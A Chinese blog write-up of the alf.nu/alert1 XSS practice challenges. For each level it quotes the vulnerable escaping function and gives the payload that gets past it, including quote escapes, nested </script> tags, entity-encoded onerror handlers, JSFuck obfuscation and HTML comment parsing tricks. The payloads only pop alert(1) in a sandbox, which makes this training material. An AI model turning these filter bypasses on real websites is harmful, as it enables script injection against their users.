---
title: alf.nu/alert1总结
date: 2018-10-14 12:39:04
tags:
- xss
categories:
- web安全
---


在做 alf.nu/alert1 时候的一些总结，主要是xss这种低安全级别的注意事项。
<!-- more -->
# 题目
## warmup 
```
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```
在html中直接闭合 双引号【"】。

## Adobe

```
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```
这里双引号被过滤了，只有想办法绕过过滤。

1. 由题可知过滤方法只将【"】替换为了【\"】，没有对【\】本身进行转义，所以我们可以通过输入【\"】来进行绕过，我们的【\】会将原本的【\】给转义掉，从而实现绕过！
2. 直接闭合 `<script>` 标签即可。


## JSON

```
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```
json.stringify()方法是将一个JavaScript值转换成Json字符串，将一个传入的对象（这里是字符串）加上双引号，并转义【"】，但是会对 【\】 进行转义。
这里其实涉及到html标签的优先级，script标签时具有高优先级的，就是说当我们在script标签中出现了 `</script>`标签，那么就会闭合前面那个 `<script>` ，从而实现绕过。

## JavaScript

```
function escape(s) {
  var url = 'javascript:console.log(' + JSON.stringify(s) + ')';
  console.log(url);

  var a = document.createElement('a');
  a.href = url;
  document.body.appendChild(a);
  a.click();
}
```
这次字符串出现在了url中，同样是绕过 【"】，url编码规定在url中url编码会自动解码，但是js是不会解码的，所以url编码后的【"】js是不认识的，所以我们就成功逃过了JSON.stringify对【"】的转义。


【"】 在 url中的编码：
```
from urllib import quote
quote("\"")
==> '%22'
```

	%22);alert(1)//

## Markdown

```
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

这是某些markdown语法的实现方式。
第一条代码： 【<】【"】都被转义为html实体。 
第二条代码： 将输入的链接自动生成了a标签。
第三条代码： Markdown标准插入图片的语法即 [[src|alt]]，【|】左边遍是图片的src，右边是图片的alt属性。 

从第一条可以基本确定我们想要直接输入 `<script>` 等标签以及双引号是不太可能的了，第二条是关于url的，那么我们可不可以使用javascript伪协议呢？答案是不行，正则规定了只有 http:// 开头的才可以生成a标签，那么再看一下最后一条，由于第一条的实体编码导致我们输入【"】与【<】都不行了。
能不能结合所有已知条件看不能创造【"】，输入 http:// 什么的时候就会自动生成a标签，a标签中就会有双引号，它正好闭合alt的第一个【"】： 

payload
```
[[1|http://onerror=alert(1)//]]
```

## DOM

```
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```

这个题目目的是JavaScript中DOM创建DOM节点。我们的目的就是能够执行 `alert(1)`，那么创建dom节点就那么几个方法，像 `Element`、 `TextNode` 这种就没机会了，一个是只能淡出创建空标签，一个是只能输出纯文本，都不能利用。 其他方法还包括Comment，它创建的节点为 `<!-- node -->` 我们需要闭合 `<!--` 即可。

[document.createComment](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/createComment)

## Callback

```
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/</g, '\\u003c');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```

回调函数是有限制的（只能由字母、[、]、单引号组成），不能用任意的，obj是一个序列化后的对象，json转换函数中将【<】替换为十六进制的编码\u003C，这个过滤导致我们无法使用这样的标签。我们可控的就callback与obj的值，callback不一定要是一个函数，我们需要做的就是闭合 `({"userdata":"` 这段字符串想办法绕过obj，让它不在是一个对象，否则我们是不可能弹窗的:

payload
`'#';alert(1)//`

## Skandia 

```
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

这道题目中没有过滤函数，仅仅只有一个大小写函数。
目标：还是通过关闭存在的 `<script>` 标签创建一个对大小写不敏感的标签来执行 `onerror` 函数。
需要注意的是 JS 对大小写敏感，html 对大小写不敏感。
那么可以创建 `<img>` 标签，利用其属性函数 `onerror` ， 将它赋值为 `alert(1)`，并转换 alter为 `html实体字符` 就可以完成任务。

html 字符实体类似这样：

> &entity_name;
或者
> &#entity_number;

如需显示小于号，我们必须这样写：`&lt;` 或 `&#60;` 或 `&#x3c;`

```
binascii.hexlify('alert')
Out: '616c657274'
```

写img标签时，需要加上 `src` 属性。

`</script><img src onerror=&#97&#108&#101&#114&#116(1)>`
or
`</script><img src onerror=&#x61&#x6c&#x65&#x72&#x74(1)>`


## Template

```
function escape(s) {
  function htmlEscape(s) {
    return s.replace(/./g, function(x) {
       return { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[x] || x;       
     });
  }

  function expandTemplate(template, args) {
    return template.replace(
        /{(\w+)}/g, 
        function(_, n) { 
           return htmlEscape(args[n]);
         });
  }
  
  return expandTemplate(
    "                                                \n\
      <h2>Hello, <span id=name></span>!</h2>         \n\
      <script>                                       \n\
         var v = document.getElementById('name');    \n\
         v.innerHTML = '<a href=#>{name}</a>';       \n\
      <\/script>                                     \n\
    ",
    { name : s }
  );
}
```
最后一个return，调用 `expandTemplate` 函数对一串html元素处理，而 `expandTemplate` 函数定义里面又调用了 `htmlEscape` ，
`htmlEscape` 对 单双引号，&和<,>都转化为html实体字符了，但没过滤\转义符。

`innerHTML` 是 JS 字符串，使用十进制或者是十六进制来替换 【<】，【>】，来绕过这个函数。


`\x3cimg src onerror=alert(1)\x3e`
or
`\u003cimg src=a onerror=alert(1)\u003e`

## JSON2

```
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```
stringify可转义【"】，并且转义【\】，`</script`  根据正则表达式替换成空字符串。g是全局模式，i就忽略大小写。

对付这种正则表达式的办法用字符串拼接。将替换成空的字符串嵌入到目标字符串中。

payload:
`</</scriptscript><script>alert(1)//`


output
`<script>console.log("</script><script>alert(1)//");</script>`

## Callback2
```
function escape(s) {
  // Pass inn "callback#userdata"
  var thing = s.split(/#/); 

  if (!/^[a-zA-Z\[\]']*$/.test(thing[0])) return 'Invalid callback';
  var obj = {'userdata': thing[1] };
  var json = JSON.stringify(obj).replace(/\//g, '\\/');
  return "<script>" + thing[0] + "(" + json +")</script>";
}
```

与 `Callback` 题目类似的，不同之处在于在本题中过滤了反斜杠。这就导致了 `Callback`的答案中的注释 `//` 是无法使用的。但是鉴于最后的JavaScript的代码会嵌入了html代码中，因此可以考虑使用html的注释方法来完成本题。


payload:
`'#';alert(1)<!--`

Output
` <script>'({"userdata":"';alert(1)<!--"})</script>`

## Skandia 2

```
function escape(s) {
  if (/[<>]/.test(s)) return '-';

  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

一旦匹配到 【<】 和 【>】 就会直接返回 `-`，又检查大写，但是不能输入 `<` 和 `>` ，能不能对alert变换一下呢。
参考其他的博客，都说用到了 `jsfuck`。

### jsfuck

jsfuck 以这种风格写成的代码中仅使用 `[` 、 `]`、 `(`、 `)`、 `!` 和 `+` 六种字符。此编程风格的名字派生自仅使用较少符号写代码的Brainfuck语言。但与其他深奥编程语言不同的是，以JSFuck风格写出的代码不需要另外的编译器或解释器来执行，无论浏览器或JavaScript引擎中的原生JavaScript解释器皆可直接运行。

加密网站：http://www.jsfuck.com/

这里仅需要将 `");alert(1)//` 中的 `alert(1)`用jsfuck语言表示出来即可。

```
");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()//
```

## iframe

```
function escape(s) {
  var tag = document.createElement('iframe');

  // For this one, you get to run any code you want, but in a "sandboxed" iframe.
  //
  // https://4i.am/?...raw=... just outputs whatever you pass in.
  //
  // Alerting from 4i.am won't count.

  s = '<script>' + s + '<\/script>';
  tag.src = 'https://4i.am/?:XSS=0&CT=text/html&raw=' + encodeURIComponent(s);

  window.WINNING = function() { youWon = true; };

  tag.setAttribute('onload', 'youWon && alert(1)');
  return tag.outerHTML;
}
```

encodeURIComponent() 函数可把字符串作为 URI 组件进行编码。
如：
```
<script type="text/javascript">

document.write(encodeURIComponent("http://www.w3school.com.cn"))
document.write("<br />")

document.write(encodeURIComponent(",/?:@&=+$#"))

</script>
```
输出：
```
http%3A%2F%2Fwww.w3school.com.cn
%2C%2F%3F%3A%40%26%3D%2B%24%23
```

iframe是html的一个标签，可以在网页中创建内联框架，有个src属性（指向文件地址，html、php等）可以选择内联框架的内容。`window.name`（一般在js代码里出现）的值不是一个普通的全局变量，而是当前窗口的名字，这里要注意的是每个iframe都有包裹它的window，而这个window是top window的子窗口，而它自然也有window.name的属性，window.name属性的神奇之处在于name 值在不同的页面（甚至不同域名）加载后依旧存在（如果没修改则值不会变化），并且可以支持非常长的 name 值（2MB）。

这个题目就是需要使用html的编码方法来完成任务。
本题的解决思路要利用到iframe的特性，当在iframe中设置了一个name属性之后， 这个name属性的值就会变成iframe中的window对象的全局。现在有意思的地方在于，iframe可以定义自己的window.name对象，当windowa.name不存在的同时注入了一个新的name的时候。所以我们需要做的就是干扰iframe使它认为window.name的指就是 `youWon`，那么这个时候 `alert(1)` 就可以被触发。

那个网址 `https://4i.am/?...raw=... just outputs whatever you pass in.` 直接返回js，那么可以由此设置iframe的name属性。

最终的解决方法是：

`name='youWon'`

[利用window.name+iframe跨域获取数据详解](https://www.cnblogs.com/zichi/p/4620656.html)

## TI(S)M
```
function escape(s) {
  function json(s) { return JSON.stringify(s).replace(/\//g, '\\/'); }
  function html(s) { return s.replace(/[<>"&]/g, function(s) {
                        return '&#' + s.charCodeAt(0) + ';'; }); }

  return (
    '<script>' +
      'var url = ' + json(s) + '; // We\'ll use this later ' +
    '</script>\n\n' +
    '  <!-- for debugging -->\n' +
    '  URL: ' + html(s) + '\n\n' +
    '<!-- then suddenly -->\n' +
    '<script>\n' +
    '  if (!/^http:.*/.test(url)) console.log("Bad url: " + url);\n' +
    '  else new Image().src = url;\n' +
    '</script>'
  );
}
```

在html5中如果是 `<!–-<script>` 中的代码都会认为是JavaScript的代码，直到遇到了 `-->` 的结束标识符。

## JSON 3
```
function escape(s) {
  return s.split('#').map(function(v) {
      // Only 20% of slashes are end tags; save 1.2% of total
      // bytes by only escaping those.
      var json = JSON.stringify(v).replace(/<\//g, '<\\/');
      return '<script>console.log('+json+')</script>';
      }).join('');
}
```

我们需要填写的字符串的格式是payload#payload的格式。那么最后将会被渲染为：
```
<script>console.log("payload1")</script><script>console.log("payload2")</script>
```

这道题目同样是需要用到和 `TI(S)M` 题中一样的html5放入特性。即在html5中，`<!–<script>` 中的代码全部会被认为是JavaScript的代码，直到遇到了 `-->` 的结束标识符。

我们输入`<!--<script>#payload2`

得到：
```
<script>console.log("<!--<script>")</script><script>console.log("payload2")</script>
```

由于 `<!–-<script>` 中的代码都会认为是JavaScript的代码，所以可以将`</`的意义转变，变成 逻辑小于号和正则表达式。
需要在 `payload2` 中闭合正则表达式，并注意将里面的 `(` 转义或者 将其闭合，正则表达式中的 `()`  `[]`  `{}`有不同的意思。 `()` 是为了提取匹配的字符串。表达式中有几个 `()` 就有几个相应的匹配字符串。否则报错
```
Error: Uncaught SyntaxError: Invalid regular expression: /script><script>console.log("/: Unterminated group
```
简化下：
```
console.log("<!--<script>")   <        /script><script>console.log(")/;       alert(1)
也就是
console()    小于号    /正则表达式/ ;  alert(1)
```
还要注意在 js中将 `-->` 放在注释里面。


payload:
```
<!--<script>#)/;alert(1)//-->
```


# 问题总结

什么时候加 【;】




# 参考

[alf.nu/alert1 writeup(1-7)](https://blog.csdn.net/he_and/article/details/79672900)
[escape.alf.nu XSS Challenges 8-15 之进阶的XSS](https://blog.csdn.net/u012763794/article/details/51526725)
[XSS练习平台【a/lert(1) to win】](https://blog.csdn.net/taozijun/article/details/81004359)